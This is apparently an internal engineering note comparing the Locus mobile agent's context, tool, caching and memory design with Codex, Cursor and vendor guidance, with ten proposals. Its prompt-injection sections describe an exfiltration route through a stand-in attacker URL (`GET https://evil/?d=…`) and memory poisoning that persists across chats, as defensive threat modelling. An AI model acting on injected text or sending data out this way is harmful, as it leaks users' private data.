# Agent algorithms, compared with the best 2026 systems

Third research round (2026-11-01). How Locus's agent core (`core/agent`, `core/data`, `core/llm`) compares with Codex, Cursor, opencode and Anthropic's and OpenAI's published guidance on context, tools, caching, memory and prompt-injection defence. Claims about Locus were checked against the code; claims about other systems against their source or docs. Ideas only, in our own words. "Unverified" marks what couldn't be confirmed from a primary source. The roadmap section "From the November 2026 research" turns this into work items.

## Gaps the docs didn't mention

1. **Long tasks can overflow the context.** Compaction runs only before a new user message (`AgentRunner.send()` checks `needsCompaction`) or when the user asks. It never runs inside a run, because `AgentLoop.run` holds the transcript in memory, and no provider's context-overflow error is recognised. Since #41 chats have no step limit, so a long task on OpenAI, OpenAI-compatible, Gemini or Ollama fills the window and ends as `Outcome.Failed`. Only Anthropic models with server compaction are covered. Helpers (25 steps, ~96k tokens for one page read) have no compaction at all.
2. **Some tools return outside text unmarked.** `fetch_url` (`WebTools.kt`), `mcp_call` (`McpTools.kt:250`; Linear, Notion and Sentry content is third-party text), `connector_call`, `run_command` and `ssh_exec` don't use `UntrustedContent.wrap`. Web search/read, the browser, email, GitHub and SiteFiles do.
3. **Data can leave the phone without approval.** `browser_open` is READ and Allow, and a `fetch_url` GET counts as an observation, so both run in read-only and scheduled runs. A scheduled run that reads email therefore has untrusted input, private data and a way out (`GET https://evil/?d=…`): the "lethal trifecta". The reviewer only sees Ask-level calls, and scheduled runs never reach it.
4. **MCP tools lose most of their schema.** `mcp_list_tools` prints each argument as `name: type`; descriptions, enums, nested objects and examples are dropped. `mcp_call` arguments aren't validated against the server's schema.
5. **Memory is a lasting injection channel.** `memory_save` is Allow by default, topics record no provenance, and the memory index goes into every new chat's system prompt. Text injected in one run can persist into all later chats (the "SpAIware" pattern). The only guard is reflection's prompt line telling it to ignore instructions from web pages.

## Top 10, by impact over effort

| # | Proposal | Effort | Impact |
|---|---|---|---|
| 1 | Compaction inside a run, plus recovery from overflow | M | Very high |
| 2 | Taint tracking and egress control | S–M | Very high (security) |
| 3 | Deferred tool loading on Anthropic and OpenAI | M | High |
| 4 | Full MCP schemas and argument checks | S | Medium-high |
| 5 | Spill long output of every tool to a file | S | Medium-high |
| 6 | Clear old tool results only when the cache is cold | M | Medium-high |
| 7 | Longer cache lifetimes, and measuring hits | S | Medium (cost) |
| 8 | Parallel read-only calls | S–M | Medium (latency) |
| 9 | Ranked memory search with provenance | S (FTS5), M (embeddings) | Medium |
| 10 | Evidence-based completion check | S | Medium |

### 1. Compaction inside a run, plus recovery from overflow (M, very high)

**Elsewhere.**
- Codex compacts mid-turn: `codex-rs/core/src/session/turn.rs` calls `async_compaction::maybe_start(... CompactionPhase::MidTurn ...)` and rolls over on `token_limit_reached`. It starts the summary in the background before the limit (`take_ready`), so nobody waits.
- Codex's `compact.rs` keeps the newest user messages verbatim up to `COMPACT_USER_MESSAGE_MAX_TOKENS = 20_000`, with the summary last. On `ContextWindowExceeded` it drops the oldest item and retries.
- OpenAI's Responses API compacts server-side through `context_management` and `compact_threshold`, or the standalone `/responses/compact` ([guide](https://developers.openai.com/api/docs/guides/compaction)). Exact request schema unverified.
- opencode keeps a `reserved` token buffer so compaction itself can't overflow (`packages/web/src/content/docs/config.mdx`).
- Cursor points the agent at the full history file after summarising, so it can look up details the summary dropped ([dynamic context discovery](https://cursor.com/blog/dynamic-context-discovery), 2026-01-06).
- Anthropic advises compacting "by maximizing recall" first: decisions, unresolved bugs, implementation details ([effective context engineering](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)).

**Locus: partly.** Compaction exists (80% threshold, cache-reusing request, `Part.Checkpoint`; `AgentRunner.kt:406-437, 1061`) but only between user turns. Afterwards the model sees only the summary: no user messages verbatim, and the todo list survives only if the summary repeats it. Overflow errors aren't recognised (no `context_length` or "too long" handling in `core/llm`). Server compaction for Responses is an open roadmap item.

**Proposal.**
- An `AgentConfig.compactAtStepBoundary` hook beside `atStepBoundary`. After a step, if context exceeds 0.8 × window or the provider returned an overflow error, call the existing `compactionRequest` (same prefix, so a cache read).
- Replace the in-memory transcript with: summary, the last ~20k tokens of the user's own messages, the current todo list, the pending step. The store stays append-only; `modelContext` already rebuilds the view from the checkpoint.
- Put the chat id in the summary and give `chat_history_read` optional `offset` and `include_tool_results`, so the agent can recover what the summary dropped.
- Start the summary in the background at ~70%, as Codex does. Treat an overflow 400 as "compact, retry once". Turn on Responses `compact_threshold` for OpenAI. Apply the same to helpers.

### 2. Taint tracking and egress control (S–M, very high)

**Research.**
- Meta's "Agents Rule of Two" (2025-10-31): in one session an agent should combine at most two of untrusted input, access to sensitive data or systems, and changing state or communicating out. Read through [a secondary write-up](https://simonw.substack.com/p/new-prompt-injection-papers-agents); Meta's original wording unverified.
- CaMeL ([arXiv 2503.18813](https://arxiv.org/abs/2503.18813); code at [google-research/camel-prompt-injection](https://github.com/google-research/camel-prompt-injection)) tracks the provenance of every value and blocks untrusted data from reaching sinks. 77% of AgentDojo tasks with provable security in v1; 67% is cited for a later version (which version reports which number is unverified).
- Spotlighting (Hines et al., [arXiv 2403.14720](https://arxiv.org/abs/2403.14720)) cut attack success from above 50% to below 2% on GPT-family models with little task loss.

**Locus: partly.** The reviewer is well designed (never sees tool output, only the user's messages count as trusted, a circuit breaker; `ToolReviewer.kt`). There's no run-level taint, the untrusted marking has the gaps above, the delimiter is a fixed tag (defused but not randomised), and GET or `browser_open` can send data out unchecked.

**Proposal** (no change to the prompt or tool list, so caching is unaffected):
- An `isUntrustedSource` flag on `Tool`, set for fetch_url, mcp_call, connector_call, email_*, browser reads, web_*, github_read and SSH output. `AgentLoop` keeps a per-run `RunTaint(sources, seenStrings)`.
- Once tainted: outward calls, and URL-taking observations (`browser_open`, `fetch_url` GET) to hosts not in the user's messages or an allow-list, rise to Ask (or go to the reviewer with the taint source in its context). Arguments containing long substrings of untrusted text, or secret-like query strings, are flagged: a cheap form of CaMeL's provenance. `memory_save`, `skill_create` and `connector_create` become drafts or Ask.
- Scheduled read-only runs: no GET to new hosts after taint.
- Wrap every untrusted source with `UntrustedContent.wrap`; optionally a per-chat random nonce in the tag, frozen in the system prompt.

### 3. Deferred tool loading on Anthropic and OpenAI (M, high)

**Providers.**
- Anthropic's `tool_search_tool_bm25_20251119` and `tool_search_tool_regex_20251119` with `defer_loading: true` ([tool search](https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool)). Deferred tools are kept out of the system-prompt prefix, so prompt caching is preserved. The docs say tool choice degrades past 30–50 tools and search usually cuts definitions by over 85%. A client-side search can return `tool_reference` blocks itself.
- Anthropic's tests ([advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use), 2025-11-24): Opus 4 from 49% to 74%, Opus 4.5 from 79.5% to 88.1% on MCP evals; context from ~77k to 8.7k tokens.
- OpenAI Responses has `tool_search` with `defer_loading` on functions and MCP servers ([guide](https://developers.openai.com/api/docs/guides/tools-tool-search); exact event shapes unverified).
- Cursor reported 46.9% fewer total tokens with on-demand MCP tools.

**Locus: partly.** MCP already sits behind two fixed meta-tools (cache-safe). But about 110 built-in tools (counted from `ToolCapability.BY_TOOL`) are declared on every request, including integrations with no key saved (`ToolCatalog.forChat`). `PromptBudget` doesn't count tool definitions, which matters for 8–32k local models. Total tool tokens are unmeasured; the "What was sent" viewer can measure them.

**Proposal.** At chat creation (frozen, like `mcpFirst`), mark integration, rarely used and MCP tools `defer_loading` and keep ~15 core tools loaded (files, run_command, web, memory, todo, ask_user, agent_*). On Anthropic add the BM25 search tool and send MCP tools as real deferred tools with full schemas and their own names; on Responses use `tool_search`. Elsewhere keep the fixed list but leave out keyless integrations at creation (a one-time change, as `McpFirst` already does).

### 4. Full MCP schemas and argument checks (S, medium-high)

Anthropic's "Writing tools for agents" guidance and its tool-use examples (72% to 90% on complex parameters, in the [advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use) post) show that schemas and examples matter. **Locus lacks it** (`McpTools.kt:198-211` drops descriptions, enums and nesting).

**Proposal.** `mcp_list_tools` returns a compact JSON Schema per tool (shortened descriptions, enums kept), with an optional `tool` argument for one tool's full schema. `mcp_call` runs the existing `validateArguments` against the cached schema before the network call and says what to fix. Results are wrapped as untrusted (#2).

### 5. Spill long output of every tool to a file (S, medium-high)

Cursor writes long tool and MCP output to files and has the agent `tail` them, with fewer unneeded summarisations ([blog](https://cursor.com/blog/dynamic-context-discovery)); Claude Code does the same for long Bash output. **Locus: partly.** Only `run_command` saves to `.locus/out/` with head and tail. Everything else is cut to its first 60k characters in `AgentLoop.execute` (`maxResultChars`); MCP cuts at 40k and `fetch_url` at 20k, all head-only.

**Proposal.** Move the spill into `AgentLoop`'s single `bounded` step: inline ~12–16k characters (head plus tail) with "full output: .locus/out/…", a tighter limit for helpers (which also addresses the 96k researcher read), secrets scrubbed as `run_command` does. Tools that page their own output (read_file, browser diffs) opt out.

### 6. Clear old tool results only when the cache is cold (M, medium-high)

**Anthropic.** Context editing `clear_tool_uses_20250919` with `trigger`, `keep`, `clear_at_least` and `exclude_tools` (beta `context-management-2025-06-27`; [docs](https://platform.claude.com/docs/en/build-with-claude/context-editing)). Clearing invalidates the cached prefix, so the docs advise clearing enough to make that worthwhile. Anthropic reports +29% on its agentic-search eval, +39% with the memory tool, and 84% fewer tokens over 100 turns ([context management](https://claude.com/blog/context-management), 2025-09-29). Claude Code's "microcompact" reportedly clears old tool results after the cache expires (unverified, reverse-engineered).

**Locus: lacks it, and the roadmap rules out mid-chat trimming** because it breaks caching.

**Proposal (cache-neutral).** Edit only the wire view; storage stays append-only. Clear only when the last request is older than the cache lifetime (the next request rewrites the prefix anyway) or at compaction. Replace tool results older than the last 5 and over ~2k characters with `[cleared: N chars, saved at .locus/out/…]`. This keeps the roadmap's intent because it never invalidates a warm cache. On Anthropic, server-side `clear_tool_uses` with `clear_at_least` is the alternative; whether client-edited `tool_result` text is accepted alongside signed thinking blocks is unverified, and the server route avoids the question.

### 7. Longer cache lifetimes, and measuring hits (S, medium)

**Docs** ([Anthropic prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)): a 5-minute write costs 1.25×, a 1-hour write 2×, a read 0.1× (0.05× on Opus 5.5). Longer-TTL entries must come before shorter ones. A read refreshes the lifetime for free, counted from the start of the request. OpenAI caches for at least 30 minutes on GPT-5.6 and later; `prompt_cache_retention: "24h"` applies to older models ([OpenAI prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching)).

**Locus: partly.** Always 5 minutes (`AnthropicChatModel.kt:~380`); hits never confirmed against the live API. On a phone, gaps for messages, approvals and `ask_user` (up to 30 minutes) often exceed 5 minutes, so the whole prefix is rewritten.

**Proposal.** `ttl: "1h"` on the breakpoint after tools and system; keep the rolling message breakpoint at 5 minutes. Record cache reads and writes per step in Insights and confirm hits on the phone. A keep-warm ping during a pending approval is possible, but thinking-setting changes break the message cache, so doing it safely is unverified.

### 8. Parallel read-only calls (S–M, medium)

Codex runs parallel-safe tools concurrently (`codex-rs/core/src/tools/parallel.rs`); MCP tools qualify when they advertise `readOnlyHint` (`handlers/mcp.rs:172`). Models routinely emit several reads per turn. **Locus lacks it:** `executeAll` runs calls one at a time so approvals arrive in order (`AgentLoop.kt:~376`).

**Proposal.** Split a turn's calls into runs: consecutive calls that are Allow, `isObservation` and hold no lease run together under `coroutineScope { async }`; anything that asks, writes or holds the browser lease waits its turn. Results stay in call order, so the transcript is unchanged.

### 9. Ranked memory search with provenance (S for FTS5 and provenance, M for embeddings; medium)

**Research.** Mem0 ([arXiv 2504.19413](https://arxiv.org/abs/2504.19413)) extracts and consolidates memories: +26% relative over OpenAI's memory on LLM-as-a-judge, 91% lower p95 latency, over 90% fewer tokens than full context. Letta's sleep-time compute ([arXiv 2504.13171](https://arxiv.org/abs/2504.13171)) needs about 5× less test-time compute. [EmbeddingGemma](https://developers.googleblog.com/introducing-embeddinggemma/) (308M parameters, under 200 MB RAM quantised) runs on the device; LiteRT on Android unverified.

**Locus: partly.** `AgentHome.searchMemory` counts raw substring matches with no ranking. It splits on `\W+` and drops words of 2 characters or fewer; on the JVM `\W` is ASCII-only, so non-Latin queries return nothing (Android's ICU regex may differ, unverified on device), and 2-character CJK words are dropped regardless. No provenance, dates or decay. Semantic recall is on the roadmap.

**Proposal.** Index topics in an FTS5 table ranked by `bm25()`, unicode61 plus a trigram table for CJK (the infrastructure exists from search.md). Frontmatter per topic: `source_chat`, `saved_at`, `by: user|agent|reflection`, `tainted`, shown in Library and in "facts read". Later: hybrid ranking with on-device embeddings, and an opt-in consolidation job while charging that proposes merges or deletions as drafts. The memory index stays frozen per chat, so this is cache-safe.

### 10. Evidence-based completion check (S, medium)

Without outside feedback, models struggle to correct their own reasoning and can get worse (Huang et al., [arXiv 2310.01798](https://arxiv.org/abs/2310.01798), ICLR 2024). Anthropic's [long-running harness post](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents) (2025-11-26) names declaring victory too early as a failure mode, fixed with progress files, feature lists and end-to-end tests. **Locus: partly.** The prompt says not to claim success before a check passes; nothing enforces it.

**Proposal.** When the model ends a turn with something concrete still open (todos pending or in progress, the last `run_command` exited non-zero, or files edited after the last test or build), append one hidden `ModeNote` (append-only, cache-safe) asking it to finish, verify, or say plainly what's unverified. At most once per task, skipped in read-only runs, no LLM critic.

## Also worth doing

- **Advisor tool** (Anthropic beta `advisor_20260301`, header `advisor-tool-2026-03-01`; [docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/advisor-tool)): a cheap model works and consults a stronger one (typically 400–700 output tokens per call; about +7 points pass rate for Haiku in Anthropic's tests). Chosen at chat creation since it's in the tool list. S–M. Also covers "plan on one model, execute on another".
- **Sub-agents are already close to best practice** (fork mode, report caps, delegation guidance after Anthropic's multi-agent post, `prompt_cache_key` per profile). The gaps are helper compaction (#1) and output caps (#5).

## Verified and not

- **Checked in Locus's code:** both compaction call sites, serial `executeAll`, the 60k head-only cut, the untrusted-marking gaps, `browser_open` as Allow, `fetch_url` GET as an observation, the MCP schema loss, memory search, the 5-minute cache lifetime, and the full registry declared per chat.
- **Checked in docs or source:** Anthropic's tool search, context editing, prompt caching and advisor docs; Codex mid-turn compaction, `compact.rs` and parallel tools; Cursor's blog; opencode's config docs; the abstracts of Huang et al., Mem0, sleep-time compute and spotlighting.
- **Unverified:** Claude Code microcompact internals; the Rule of Two's original wording; which CaMeL version reports which number; the exact OpenAI compaction and tool-search wire formats; Android's `\W` behaviour; the total size of Locus's tool definitions; whether client-side `tool_result` edits are accepted alongside signed thinking.
